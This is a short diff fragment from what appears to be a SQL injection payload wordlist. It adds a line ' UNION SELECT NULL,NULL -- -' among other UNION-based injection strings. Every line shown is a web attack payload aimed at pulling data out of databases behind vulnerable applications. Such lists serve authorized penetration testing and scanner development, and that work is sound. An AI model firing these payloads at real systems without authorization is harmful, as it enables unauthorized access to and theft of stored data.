@@ -145,7 +145,7 @@ AND false
 -1' UNION SELECT 1,2,3--+
 ' UNION SELECT sum(columnname ) from tablename --
 
-
+' UNION SELECT NULL,NULL -- -
 -1 UNION SELECT 1 INTO @,@
 -1 UNION SELECT 1 INTO @,@,@
 
